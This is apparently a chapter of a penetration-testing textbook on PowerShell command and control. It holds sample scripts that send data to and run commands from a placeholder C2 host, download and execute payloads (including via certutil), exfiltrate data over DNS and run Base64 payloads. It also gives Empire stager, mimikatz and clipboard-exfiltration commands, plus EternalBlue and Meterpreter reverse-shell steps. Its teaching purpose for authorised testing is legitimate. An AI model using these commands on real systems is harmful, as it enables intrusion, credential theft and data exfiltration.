<html><head></head><body>
<div id="_idContainer062">
<h1 class="chapter-number" id="_idParaDest-449"><a id="_idTextAnchor447"/><span class="koboSpan" id="kobo.1.1">14</span></h1>
<h1 id="_idParaDest-450"><a id="_idTextAnchor448"/><span class="koboSpan" id="kobo.2.1">Command and Control</span></h1>
<p><span class="koboSpan" id="kobo.3.1">In the ever-evolving landscape of cybersecurity, harnessing the power of PowerShell has become a cornerstone in the toolkit of penetration testers seeking to replicate real-world scenarios. </span><span class="koboSpan" id="kobo.3.2">This chapter delves into the art and science</span><a id="_idIndexMarker896"/><span class="koboSpan" id="kobo.4.1"> of utilizing PowerShell for </span><strong class="bold"><span class="koboSpan" id="kobo.5.1">Command and Control</span></strong><span class="koboSpan" id="kobo.6.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.7.1">C2</span></strong><span class="koboSpan" id="kobo.8.1">) during penetration testing, where security professionals simulate attacks to evaluate the robustness of </span><span class="No-Break"><span class="koboSpan" id="kobo.9.1">their defenses.</span></span></p>
<p><span class="koboSpan" id="kobo.10.1">PowerShell, a task automation framework from Microsoft, has emerged as a double-edged sword – a tool for both defenders and attackers. </span><span class="koboSpan" id="kobo.10.2">As organizations fortify their defenses, adversaries leverage PowerShell’s versatility to navigate through networks stealthily, establish persistent connections, and execute malicious commands. </span><span class="koboSpan" id="kobo.10.3">This chapter navigates the intricate landscape of PowerShell in a penetration testing context, unraveling its capabilities for </span><span class="No-Break"><span class="koboSpan" id="kobo.11.1">C2 operations.</span></span></p>
<p><span class="koboSpan" id="kobo.12.1">We begin by exploring foundational concepts, understanding how PowerShell can be weaponized for post-exploitation activities. </span><span class="koboSpan" id="kobo.12.2">The chapter unveils the myriad ways penetration testers can emulate adversarial tactics, from leveraging built-in cmdlets and scripts to executing sophisticated obfuscation techniques. </span><span class="koboSpan" id="kobo.12.3">Practical examples guide you through the intricacies of executing commands, manipulating systems, and evading detection – all within the controlled framework of a </span><span class="No-Break"><span class="koboSpan" id="kobo.13.1">penetration test.</span></span></p>
<p><span class="koboSpan" id="kobo.14.1">As we journey through this chapter, you will gain insights into the proactive use of PowerShell to strengthen defensive strategies. </span><span class="koboSpan" id="kobo.14.2">Understanding an adversary’s perspective is crucial in fortifying cyber defenses, and this chapter equips security professionals with the knowledge to navigate the dynamic landscape of PowerShell-based C2 during </span><span class="No-Break"><span class="koboSpan" id="kobo.15.1">penetration tests.</span></span></p>
<p><span class="koboSpan" id="kobo.16.1">The following are the main topics covered in </span><span class="No-Break"><span class="koboSpan" id="kobo.17.1">this chapter:</span></span></p>
<ul>
<li><span class="koboSpan" id="kobo.18.1">Post-exploitation, C2, and the cyber </span><span class="No-Break"><span class="koboSpan" id="kobo.19.1">kill chain</span></span></li>
<li><span class="koboSpan" id="kobo.20.1">PowerShell components used </span><span class="No-Break"><span class="koboSpan" id="kobo.21.1">for C2</span></span></li>
<li><span class="koboSpan" id="kobo.22.1">Using Empire </span><span class="No-Break"><span class="koboSpan" id="kobo.23.1">for C2</span></span></li>
<li><span class="koboSpan" id="kobo.24.1">Using Meterpreter and PowerShell </span><span class="No-Break"><span class="koboSpan" id="kobo.25.1">for C2</span></span></li>
</ul>
<h1 id="_idParaDest-451"><a id="_idTextAnchor449"/><span class="koboSpan" id="kobo.26.1">Post-exploitation, C2, and the cyber kill chain</span></h1>
<p><span class="koboSpan" id="kobo.27.1">Post-exploitation, C2, and</span><a id="_idIndexMarker897"/><span class="koboSpan" id="kobo.28.1"> the cyber kill chain</span><a id="_idIndexMarker898"/><span class="koboSpan" id="kobo.29.1"> are fundamental concepts in </span><a id="_idIndexMarker899"/><span class="koboSpan" id="kobo.30.1">cybersecurity. </span><span class="koboSpan" id="kobo.30.2">Together, they form a framework that helps you understand, respond to, and mitigate cyber threats. </span><span class="koboSpan" id="kobo.30.3">Post-exploitation is the phase after an initial breach, where attackers aim to maintain access, escalate privileges, collect intelligence, and move laterally within a compromised system. </span><span class="koboSpan" id="kobo.30.4">This phase involves deploying malware implants, exploiting vulnerabilities, stealing credentials, and utilizing living-off-the-land techniques to </span><span class="No-Break"><span class="koboSpan" id="kobo.31.1">evade detection.</span></span></p>
<p><span class="koboSpan" id="kobo.32.1">C2 is the infrastructure and communication mechanisms that enable attackers to manage compromised systems remotely. </span><span class="koboSpan" id="kobo.32.2">This includes command servers, communication </span><a id="_idIndexMarker900"/><span class="koboSpan" id="kobo.33.1">protocols, encryption, and payload delivery. </span><span class="koboSpan" id="kobo.33.2">Attackers use </span><strong class="bold"><span class="koboSpan" id="kobo.34.1">Domain Generation Algorithms</span></strong><span class="koboSpan" id="kobo.35.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.36.1">DGAs</span></strong><span class="koboSpan" id="kobo.37.1">), staged payloads, fast flux, and encrypted communication to establish and maintain control over </span><span class="No-Break"><span class="koboSpan" id="kobo.38.1">compromised environments.</span></span></p>
<p><span class="koboSpan" id="kobo.39.1">The cyber kill chain provides </span><a id="_idIndexMarker901"/><span class="koboSpan" id="kobo.40.1">a strategic model that outlines the stages of a cyberattack, from reconnaissance to achieving the attacker’s objectives. </span><span class="koboSpan" id="kobo.40.2">The stages include reconnaissance, weaponization, delivery, exploitation, installation, C2, and actions on objectives. </span><span class="koboSpan" id="kobo.40.3">Understanding the cyber kill chain helps organizations develop targeted defenses at each stage to prevent, detect, and respond to cyber threats. </span><span class="koboSpan" id="kobo.40.4">In post-exploitation, organizations must focus on establishing persistence, privilege escalation, data collection, and lateral movement. </span><span class="koboSpan" id="kobo.40.5">Defenses involve robust endpoint protection, regular patching, and </span><span class="No-Break"><span class="koboSpan" id="kobo.41.1">comprehensive monitoring.</span></span></p>
<p><span class="koboSpan" id="kobo.42.1">C2 defenses require</span><a id="_idIndexMarker902"/><span class="koboSpan" id="kobo.43.1"> identifying and blocking communication channels, monitoring for anomalous behavior, and employing encryption inspection. </span><span class="koboSpan" id="kobo.43.2">Proactive measures such as threat intelligence, user education, and incident response planning are crucial along the cyber kill chain. </span><span class="koboSpan" id="kobo.43.3">Organizations can bolster their cybersecurity posture by comprehensively addressing post-exploitation, C2, and the cyber kill chain. </span><span class="koboSpan" id="kobo.43.4">This involves a combination of technological solutions, proactive measures, and a well-defined incident response strategy to effectively navigate and mitigate the complex challenges posed by </span><span class="No-Break"><span class="koboSpan" id="kobo.44.1">cyber threats.</span></span></p>
<h1 id="_idParaDest-452"><a id="_idTextAnchor450"/><span class="koboSpan" id="kobo.45.1">PowerShell components used for C2</span></h1>
<p><span class="koboSpan" id="kobo.46.1">PowerShell, a powerful and extensible</span><a id="_idIndexMarker903"/><span class="koboSpan" id="kobo.47.1"> scripting language, is increasingly leveraged by attackers during post-exploitation to establish C2 channels. </span><span class="koboSpan" id="kobo.47.2">In this exploration, we’ll delve into specific PowerShell components that can be used for C2 purposes, providing detailed examples to illustrate </span><span class="No-Break"><span class="koboSpan" id="kobo.48.1">their implementation.</span></span></p>
<h2 id="_idParaDest-453"><a id="_idTextAnchor451"/><span class="koboSpan" id="kobo.49.1">Cmdlets for network communication</span></h2>
<p><span class="koboSpan" id="kobo.50.1">PowerShell offers cmdlets</span><a id="_idIndexMarker904"/><span class="koboSpan" id="kobo.51.1"> that enable communication with external servers, facilitating the establishment of C2 channels. </span><span class="koboSpan" id="kobo.51.2">The </span><strong class="source-inline"><span class="koboSpan" id="kobo.52.1">Invoke-RestMethod</span></strong><span class="koboSpan" id="kobo.53.1"> cmdlet, for instance, can be employed to interact with web services. </span><span class="koboSpan" id="kobo.53.2">Consider the </span><span class="No-Break"><span class="koboSpan" id="kobo.54.1">following example:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.55.1">
$C2Server = "htt p://c2server.snowcap cyber.com"
$Payload = "Get-Process | Out-String"
# Sending data to C2 server
$response = Invoke-RestMethod -Uri "$C2Server/data" -Method Post -Body $Payload
# Executing received commands
Invoke-Expression $response</span></pre> <p><span class="koboSpan" id="kobo.56.1">In this example, the PowerShell script sends the local system’s process list to a C2 server and executes commands received </span><span class="No-Break"><span class="koboSpan" id="kobo.57.1">in response.</span></span></p>
<h2 id="_idParaDest-454"><a id="_idTextAnchor452"/><span class="koboSpan" id="kobo.58.1">Scripting for payload delivery</span></h2>
<p><span class="koboSpan" id="kobo.59.1">Attackers often use</span><a id="_idIndexMarker905"/><span class="koboSpan" id="kobo.60.1"> PowerShell scripts to download and execute malicious payloads from external sources. </span><span class="koboSpan" id="kobo.60.2">The following example demonstrates how a script can download a payload and </span><span class="No-Break"><span class="koboSpan" id="kobo.61.1">execute it:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.62.1">
# Downloading payload from C2 server
$C2Server = "htt p://c2server.snowcap cyber.com"
$PayloadURL = "$C2Server/malicious-payload.exe"
$DownloadPath = "C:\Temp\malicious-payload.exe"
Invoke-WebRequest -Uri $PayloadURL -OutFile $DownloadPath
# Executing the downloaded payload
Start-Process -FilePath $DownloadPath</span></pre> <p><span class="koboSpan" id="kobo.63.1">In this scenario, the PowerShell</span><a id="_idIndexMarker906"/><span class="koboSpan" id="kobo.64.1"> script fetches a malicious payload from the C2 server and executes it on the </span><span class="No-Break"><span class="koboSpan" id="kobo.65.1">compromised system.</span></span></p>
<h2 id="_idParaDest-455"><a id="_idTextAnchor453"/><span class="koboSpan" id="kobo.66.1">Encoded payloads to evade detection</span></h2>
<p><span class="koboSpan" id="kobo.67.1">To evade detection, attackers</span><a id="_idIndexMarker907"/><span class="koboSpan" id="kobo.68.1"> often encode their payloads. </span><span class="koboSpan" id="kobo.68.2">The Base64 encoding, for example, can be utilized to obfuscate malicious scripts. </span><span class="koboSpan" id="kobo.68.3">Consider </span><span class="No-Break"><span class="koboSpan" id="kobo.69.1">the following:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.70.1">
$EncodedPayload = "Encoded Base64 payload here"
$DecodedPayload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedPayload))
# Execute the decoded payload
Invoke-Expression $DecodedPayload</span></pre> <p><span class="koboSpan" id="kobo.71.1">In this example, the script decodes a Base64-encoded payload and executes the decoded </span><span class="No-Break"><span class="koboSpan" id="kobo.72.1">PowerShell commands.</span></span></p>
<h2 id="_idParaDest-456"><a id="_idTextAnchor454"/><span class="koboSpan" id="kobo.73.1">Dynamic code loading with functions</span></h2>
<p><span class="koboSpan" id="kobo.74.1">Attackers can dynamically load code</span><a id="_idIndexMarker908"/><span class="koboSpan" id="kobo.75.1"> into memory during post-exploitation. </span><span class="koboSpan" id="kobo.75.2">PowerShell functions provide a means to achieve this. </span><span class="koboSpan" id="kobo.75.3">Here’s </span><span class="No-Break"><span class="koboSpan" id="kobo.76.1">an example:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.77.1">
# Define a malicious function
function Invoke-MaliciousCode {
    # Malicious actions here
    Write-Host "Executing malicious code..."
</span><span class="koboSpan" id="kobo.77.2">}
# Call the malicious function
Invoke-MaliciousCode</span></pre> <p><span class="koboSpan" id="kobo.78.1">In this case, the script defines</span><a id="_idIndexMarker909"/><span class="koboSpan" id="kobo.79.1"> a function with malicious actions, which can be invoked at any point </span><span class="No-Break"><span class="koboSpan" id="kobo.80.1">during post-exploitation.</span></span></p>
<h2 id="_idParaDest-457"><a id="_idTextAnchor455"/><span class="koboSpan" id="kobo.81.1">DNS tunneling for covert communication</span></h2>
<p><span class="koboSpan" id="kobo.82.1">PowerShell can be used</span><a id="_idIndexMarker910"/><span class="koboSpan" id="kobo.83.1"> for DNS tunneling, allowing attackers to establish covert communication channels. </span><span class="koboSpan" id="kobo.83.2">The following example showcases a simple DNS </span><span class="No-Break"><span class="koboSpan" id="kobo.84.1">tunneling approach:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.85.1">
$C2Server = "malicious-dns-server.snowcapcyber.com"
$DataToSend = "Data to exfiltrate"
# Encode and send data via DNS
$EncodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($DataToSend))
Resolve-DnsName -Name "$EncodedData.$C2Server"</span></pre> <p><span class="koboSpan" id="kobo.86.1">In this example, the PowerShell script encodes data and uses DNS requests to send information to the </span><span class="No-Break"><span class="koboSpan" id="kobo.87.1">C2 server.</span></span></p>
<h2 id="_idParaDest-458"><a id="_idTextAnchor456"/><span class="koboSpan" id="kobo.88.1">Living-off-the-land techniques</span></h2>
<p><span class="koboSpan" id="kobo.89.1">PowerShell allows</span><a id="_idIndexMarker911"/><span class="koboSpan" id="kobo.90.1"> attackers to use legitimate system tools for malicious purposes, making detection challenging. </span><span class="koboSpan" id="kobo.90.2">The following example illustrates </span><span class="No-Break"><span class="koboSpan" id="kobo.91.1">living-off-the-land techniques:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.92.1">
# Use built-in tool (certutil) for downloading payload
certutil.exe -urlcache -split -f htt p://maliciou s-server.com/malicious-payload.exe
# Execute the downloaded payload
Start-Process -FilePath "C:\Windows\Temp\malicious-payload.exe"</span></pre> <p><span class="koboSpan" id="kobo.93.1">In this instance, the attacker leverages the built-in </span><strong class="source-inline"><span class="koboSpan" id="kobo.94.1">certutil</span></strong><span class="koboSpan" id="kobo.95.1"> Windows tool to download a payload, demonstrating the use of legitimate tools for </span><span class="No-Break"><span class="koboSpan" id="kobo.96.1">malicious activities.</span></span></p>
<p><span class="koboSpan" id="kobo.97.1">PowerShell components provide attackers</span><a id="_idIndexMarker912"/><span class="koboSpan" id="kobo.98.1"> with a versatile toolkit to implement C2 during post-exploitation. </span><span class="koboSpan" id="kobo.98.2">Understanding these components is crucial for defenders to detect and mitigate such threats effectively. </span><span class="koboSpan" id="kobo.98.3">By monitoring PowerShell activities, employing behavioral analysis, and implementing robust security measures, organizations can enhance their resilience against PowerShell-based C2 attacks in the </span><span class="No-Break"><span class="koboSpan" id="kobo.99.1">post-exploitation phase.</span></span></p>
<h1 id="_idParaDest-459"><a id="_idTextAnchor457"/><span class="koboSpan" id="kobo.100.1">Using Empire for C2</span></h1>
<p><span class="koboSpan" id="kobo.101.1">PowerShell Empire is an open</span><a id="_idIndexMarker913"/><span class="koboSpan" id="kobo.102.1"> source, post-exploitation framework</span><a id="_idIndexMarker914"/><span class="koboSpan" id="kobo.103.1"> that has gained popularity among penetration testers and red teamers for its versatile capabilities. </span><span class="koboSpan" id="kobo.103.2">This comprehensive exploration delves into its intricacies and demonstrates how it is used to implement (C2) </span><span class="No-Break"><span class="koboSpan" id="kobo.104.1">during post-exploitation.</span></span></p>
<h2 id="_idParaDest-460"><a id="_idTextAnchor458"/><span class="koboSpan" id="kobo.105.1">An introduction to PowerShell Empire</span></h2>
<p><span class="koboSpan" id="kobo.106.1">PowerShell Empire</span><a id="_idIndexMarker915"/><span class="koboSpan" id="kobo.107.1"> is a post-exploitation</span><a id="_idIndexMarker916"/><span class="koboSpan" id="kobo.108.1"> framework designed to simulate </span><strong class="bold"><span class="koboSpan" id="kobo.109.1">Advanced Persistent Threat</span></strong><span class="koboSpan" id="kobo.110.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.111.1">APT</span></strong><span class="koboSpan" id="kobo.112.1">) scenarios for security professionals. </span><span class="koboSpan" id="kobo.112.2">It leverages PowerShell to provide a modular and extensible platform for offensive </span><span class="No-Break"><span class="koboSpan" id="kobo.113.1">security operations.</span></span></p>
<h3><span class="koboSpan" id="kobo.114.1">Installation and setup</span></h3>
<p><span class="koboSpan" id="kobo.115.1">Before diving into examples, let’s walk</span><a id="_idIndexMarker917"/><span class="koboSpan" id="kobo.116.1"> through the installation and setup of </span><span class="No-Break"><span class="koboSpan" id="kobo.117.1">PowerShell Empire:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.118.1">
# Clone the Empire repository from GitHub
git clone http s://githu b.com/BC-SECURITY/Empire.git
# Change into the Empire directory
cd Empire
# Run the setup script
./setup/install.sh</span></pre> <p><span class="koboSpan" id="kobo.119.1">Once installed, launch the </span><span class="No-Break"><span class="koboSpan" id="kobo.120.1">Empire console:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.121.1">
# Launch the Empire console
./empire</span></pre> <p><span class="koboSpan" id="kobo.122.1">This opens the Empire console, where</span><a id="_idIndexMarker918"/><span class="koboSpan" id="kobo.123.1"> the operator can interact with various modules and configure listeners </span><span class="No-Break"><span class="koboSpan" id="kobo.124.1">for C2.</span></span></p>
<h3><span class="koboSpan" id="kobo.125.1">Listeners for C2</span></h3>
<p><span class="koboSpan" id="kobo.126.1">Empire uses listeners</span><a id="_idIndexMarker919"/><span class="koboSpan" id="kobo.127.1"> to establish C2 channels. </span><span class="koboSpan" id="kobo.127.2">Let’s create a basic </span><span class="No-Break"><span class="koboSpan" id="kobo.128.1">HTTP listener:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.129.1">
# Within the Empire console
listeners
uselistener http
set Name http_listener
set Host 0.0.0.0
set Port 8080
execute</span></pre> <p><span class="koboSpan" id="kobo.130.1">This sets up an HTTP listener, allowing agents (compromised systems) to communicate with the </span><span class="No-Break"><span class="koboSpan" id="kobo.131.1">Empire server.</span></span></p>
<h2 id="_idParaDest-461"><a id="_idTextAnchor459"/><span class="koboSpan" id="kobo.132.1">Generating and delivering payloads</span></h2>
<p><span class="koboSpan" id="kobo.133.1">Empire generates payloads</span><a id="_idIndexMarker920"/><span class="koboSpan" id="kobo.134.1"> that serve as agents on compromised systems. </span><span class="koboSpan" id="kobo.134.2">These agents communicate with the Empire server. </span><span class="koboSpan" id="kobo.134.3">Generate a PowerShell payload for a </span><span class="No-Break"><span class="koboSpan" id="kobo.135.1">Windows target:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.136.1">
# Within the Empire console
usestager windows/launcher_ps
set Listener http_listener
generate</span></pre> <p><span class="koboSpan" id="kobo.137.1">This produces a PowerShell one-liner</span><a id="_idIndexMarker921"/><span class="koboSpan" id="kobo.138.1"> payload. </span><span class="koboSpan" id="kobo.138.2">You deliver this payload to the target system through various means, such as phishing </span><span class="No-Break"><span class="koboSpan" id="kobo.139.1">or exploitation.</span></span></p>
<h2 id="_idParaDest-462"><a id="_idTextAnchor460"/><span class="koboSpan" id="kobo.140.1">Executing commands on compromised systems</span></h2>
<p><span class="koboSpan" id="kobo.141.1">Once the payload is executed</span><a id="_idIndexMarker922"/><span class="koboSpan" id="kobo.142.1"> on a target system, it establishes a connection to the Empire server. </span><span class="koboSpan" id="kobo.142.2">You interact with the agent to </span><span class="No-Break"><span class="koboSpan" id="kobo.143.1">execute commands:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.144.1">
# Within the Empire console
interact &lt;agent_ID&gt;
# Execute a command on the agent
shell whoami</span></pre> <p><span class="koboSpan" id="kobo.145.1">This demonstrates executing a simple command (in this case, retrieving the current user) on the </span><span class="No-Break"><span class="koboSpan" id="kobo.146.1">compromised system.</span></span></p>
<h2 id="_idParaDest-463"><a id="_idTextAnchor461"/><span class="koboSpan" id="kobo.147.1">Post-exploitation modules for advanced tasks</span></h2>
<p><span class="koboSpan" id="kobo.148.1">Empire includes a vast array</span><a id="_idIndexMarker923"/><span class="koboSpan" id="kobo.149.1"> of post-exploitation modules for advanced operations. </span><span class="koboSpan" id="kobo.149.2">Let’s use the </span><strong class="source-inline"><span class="koboSpan" id="kobo.150.1">mimikatz</span></strong><span class="koboSpan" id="kobo.151.1"> module to extract credentials from the </span><span class="No-Break"><span class="koboSpan" id="kobo.152.1">compromised system:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.153.1">
# Within the Empire console
interact &lt;agent_ID&gt;
# Load the mimikatz module
usemodule credentials/mimikatz
# Run mimikatz to extract credentials
execute</span></pre> <p><span class="koboSpan" id="kobo.154.1">This example showcases</span><a id="_idIndexMarker924"/><span class="koboSpan" id="kobo.155.1"> using a specialized module to perform credential extraction on the </span><span class="No-Break"><span class="koboSpan" id="kobo.156.1">compromised system.</span></span></p>
<h2 id="_idParaDest-464"><a id="_idTextAnchor462"/><span class="koboSpan" id="kobo.157.1">Exfiltrating data</span></h2>
<p><span class="koboSpan" id="kobo.158.1">Empire provides modules to exfiltrate data</span><a id="_idIndexMarker925"/><span class="koboSpan" id="kobo.159.1"> from compromised systems. </span><span class="koboSpan" id="kobo.159.2">The </span><strong class="source-inline"><span class="koboSpan" id="kobo.160.1">powershell/clipboard/paste</span></strong><span class="koboSpan" id="kobo.161.1"> module can be used to exfiltrate data stored in </span><span class="No-Break"><span class="koboSpan" id="kobo.162.1">the clipboard:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.163.1">
# Within the Empire console
interact &lt;agent_ID&gt;
# Load the clipboard exfiltration module
usemodule powershell/clipboard/paste
# Run the exfiltration module
execute</span></pre> <p><span class="koboSpan" id="kobo.164.1">This demonstrates, using an Empire module, how an operator can exfiltrate sensitive data, such as clipboard contents, from the </span><span class="No-Break"><span class="koboSpan" id="kobo.165.1">compromised system.</span></span></p>
<h2 id="_idParaDest-465"><a id="_idTextAnchor463"/><span class="koboSpan" id="kobo.166.1">Web drive-by attacks</span></h2>
<p><span class="koboSpan" id="kobo.167.1">Empire allows operators to conduct</span><a id="_idIndexMarker926"/><span class="koboSpan" id="kobo.168.1"> web drive-by attacks, leveraging</span><a id="_idIndexMarker927"/><span class="koboSpan" id="kobo.169.1"> malicious scripts hosted on a web server. </span><span class="koboSpan" id="kobo.169.2">Here’s an example of setting up a web server within Empire and delivering a malicious payload to </span><span class="No-Break"><span class="koboSpan" id="kobo.170.1">a target:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.171.1">
# Within the Empire console
usestager windows/launcher_bat
set Listener http_listener
set OutFile /var/www/html/malicious.bat
generate</span></pre> <p><span class="koboSpan" id="kobo.172.1">This sets up a web server and generates a BAT file that executes the payload when accessed by a target, establishing</span><a id="_idIndexMarker928"/><span class="koboSpan" id="kobo.173.1"> a connection</span><a id="_idIndexMarker929"/><span class="koboSpan" id="kobo.174.1"> back to the </span><span class="No-Break"><span class="koboSpan" id="kobo.175.1">Empire server.</span></span></p>
<h2 id="_idParaDest-466"><a id="_idTextAnchor464"/><span class="koboSpan" id="kobo.176.1">Evading antivirus detection</span></h2>
<p><span class="koboSpan" id="kobo.177.1">PowerShell Empire</span><a id="_idIndexMarker930"/><span class="koboSpan" id="kobo.178.1"> provides capabilities to evade antivirus detection through obfuscation techniques. </span><span class="koboSpan" id="kobo.178.2">Let’s demonstrate obfuscating a </span><span class="No-Break"><span class="koboSpan" id="kobo.179.1">PowerShell script:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.180.1">
# Within the Empire console
interact &lt;agent_ID&gt;
# Load the obfuscation module
usemodule powershell/obfuscate
# Set the script to obfuscate
set Script 'Write-Host "Hello, Empire!"'
</span><span class="koboSpan" id="kobo.180.2">execute</span></pre> <p><span class="koboSpan" id="kobo.181.1">This example shows how an operator can use Empire’s obfuscation module to obfuscate a simple </span><span class="No-Break"><span class="koboSpan" id="kobo.182.1">PowerShell script.</span></span></p>
<h2 id="_idParaDest-467"><a id="_idTextAnchor465"/><span class="koboSpan" id="kobo.183.1">Dynamic scripting</span></h2>
<p><span class="koboSpan" id="kobo.184.1">PowerShell Empire supports </span><a id="_idIndexMarker931"/><span class="koboSpan" id="kobo.185.1">dynamic scripting, allowing operators to run scripts on the fly. </span><span class="koboSpan" id="kobo.185.2">Here’s an example of running a dynamic PowerShell script on a </span><span class="No-Break"><span class="koboSpan" id="kobo.186.1">compromised system:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.187.1">
# Within the Empire console
interact &lt;agent_ID&gt;
# Run a dynamic PowerShell script
powershell -Command "Write-Host 'Dynamic script executed'"</span></pre> <p><span class="koboSpan" id="kobo.188.1">Operators can use this feature to run custom PowerShell scripts on the compromised systems </span><span class="No-Break"><span class="koboSpan" id="kobo.189.1">during post-exploitation.</span></span></p>
<h2 id="_idParaDest-468"><a id="_idTextAnchor466"/><span class="koboSpan" id="kobo.190.1">Defensive measures</span></h2>
<p><span class="koboSpan" id="kobo.191.1">Defenders must employ</span><a id="_idIndexMarker932"/><span class="koboSpan" id="kobo.192.1"> robust security measures to detect and mitigate PowerShell Empire activities. </span><span class="koboSpan" id="kobo.192.2">Implementing network monitoring, application whitelisting, and endpoint protection solutions is crucial. </span><span class="koboSpan" id="kobo.192.3">Regular security training for users to recognize social engineering tactics can also </span><span class="No-Break"><span class="koboSpan" id="kobo.193.1">enhance defenses.</span></span></p>
<p><span class="koboSpan" id="kobo.194.1">PowerShell Empire is a robust post-exploitation framework that allows security professionals to simulate real-world scenarios and test the resilience of their systems against advanced threats. </span><span class="koboSpan" id="kobo.194.2">While it provides an effective tool for red teaming and penetration testing, it also highlights the need for organizations to implement strong defensive measures to protect against such sophisticated attacks. </span><span class="koboSpan" id="kobo.194.3">Understanding PowerShell Empire’s capabilities is essential for defenders and security professionals to strengthen their cybersecurity posture in the face of </span><span class="No-Break"><span class="koboSpan" id="kobo.195.1">evolving threats.</span></span></p>
<h1 id="_idParaDest-469"><a id="_idTextAnchor467"/><span class="koboSpan" id="kobo.196.1">Using Meterpreter and PowerShell for C2</span></h1>
<p><span class="koboSpan" id="kobo.197.1">Meterpreter, a potent payload</span><a id="_idIndexMarker933"/><span class="koboSpan" id="kobo.198.1"> in the Metasploit framework, coupled with PowerShell, offers a potent combination for post-exploitation (C2). </span><span class="koboSpan" id="kobo.198.2">In this detailed exploration, we’ll explore how Meterpreter can be utilized alongside PowerShell to establish and maintain control over </span><span class="No-Break"><span class="koboSpan" id="kobo.199.1">compromised systems.</span></span></p>
<h2 id="_idParaDest-470"><a id="_idTextAnchor468"/><span class="koboSpan" id="kobo.200.1">An introduction to Meterpreter</span></h2>
<p><span class="koboSpan" id="kobo.201.1">Meterpreter is a post-exploitation</span><a id="_idIndexMarker934"/><span class="koboSpan" id="kobo.202.1"> payload within the Metasploit framework. </span><span class="koboSpan" id="kobo.202.2">It is designed to provide powerful features to interact with and control compromised systems. </span><span class="koboSpan" id="kobo.202.3">One notable advantage of Meterpreter is its versatility and the ability to run in-memory, making detection challenging for traditional </span><span class="No-Break"><span class="koboSpan" id="kobo.203.1">security measures.</span></span></p>
<h2 id="_idParaDest-471"><a id="_idTextAnchor469"/><span class="koboSpan" id="kobo.204.1">Setting up the attack environment</span></h2>
<p><span class="koboSpan" id="kobo.205.1">Before we dive into </span><a id="_idIndexMarker935"/><span class="koboSpan" id="kobo.206.1">examples, let’s set up a basic environment using Metasploit to understand </span><span class="No-Break"><span class="koboSpan" id="kobo.207.1">the fundamentals:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.208.1">
# Open a terminal and launch Metasploit
msfconsole</span></pre> <h2 id="_idParaDest-472"><a id="_idTextAnchor470"/><span class="koboSpan" id="kobo.209.1">Exploiting a vulnerability</span></h2>
<p><span class="koboSpan" id="kobo.210.1">Let’s assume we’ve identified</span><a id="_idIndexMarker936"/><span class="koboSpan" id="kobo.211.1"> a vulnerability in a target system for demonstration purposes. </span><span class="koboSpan" id="kobo.211.2">We’ll use the EternalBlue exploit to compromise a Windows machine (note that this is a hypothetical scenario and should only be performed in a controlled environment where you </span><span class="No-Break"><span class="koboSpan" id="kobo.212.1">have permission):</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.213.1">
# Within Metasploit console
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS &lt;target_IP&gt;
exploit</span></pre> <p><span class="koboSpan" id="kobo.214.1">This exploits the EternalBlue vulnerability to gain unauthorized access to the </span><span class="No-Break"><span class="koboSpan" id="kobo.215.1">target system.</span></span></p>
<h2 id="_idParaDest-473"><a id="_idTextAnchor471"/><span class="koboSpan" id="kobo.216.1">Utilizing Meterpreter</span></h2>
<p><span class="koboSpan" id="kobo.217.1">Once we have exploited the target </span><a id="_idIndexMarker937"/><span class="koboSpan" id="kobo.218.1">successfully, we can leverage Meterpreter to establish a connection and </span><span class="No-Break"><span class="koboSpan" id="kobo.219.1">gain control:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.220.1">
# Within Metasploit console
use payload/windows/meterpreter/reverse_tcp
set LHOST &lt;attacker_IP&gt;
exploit</span></pre> <p><span class="koboSpan" id="kobo.221.1">This creates a reverse TCP connection to the attacker’s machine, providing a Meterpreter shell on the </span><span class="No-Break"><span class="koboSpan" id="kobo.222.1">compromised system.</span></span></p>
<h2 id="_idParaDest-474"><a id="_idTextAnchor472"/><span class="koboSpan" id="kobo.223.1">Post-exploitation with Meterpreter</span></h2>
<p><span class="koboSpan" id="kobo.224.1">Meterpreter provides</span><a id="_idIndexMarker938"/><span class="koboSpan" id="kobo.225.1"> a wide range of functionalities for post-exploitation </span><a id="_idIndexMarker939"/><span class="koboSpan" id="kobo.226.1">activities. </span><span class="koboSpan" id="kobo.226.2">Let’s explore some </span><span class="No-Break"><span class="koboSpan" id="kobo.227.1">common tasks.</span></span></p>
<h3><span class="koboSpan" id="kobo.228.1">Filesystem manipulation</span></h3>
<p><span class="koboSpan" id="kobo.229.1">In the following, we will use Meterpreter</span><a id="_idIndexMarker940"/><span class="koboSpan" id="kobo.230.1"> to list a series of files, upload a file from a server to the target, and download a file from the target to </span><span class="No-Break"><span class="koboSpan" id="kobo.231.1">a server:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.232.1">
# List files in the current directory
ls
# Upload a file to the target system
upload /local/path/to/file.txt C:\\target\\path\\
# Download a file from the target system
download C:\\target\\path\\file.txt /local/save/</span></pre> <h3><span class="koboSpan" id="kobo.233.1">System information gathering</span></h3>
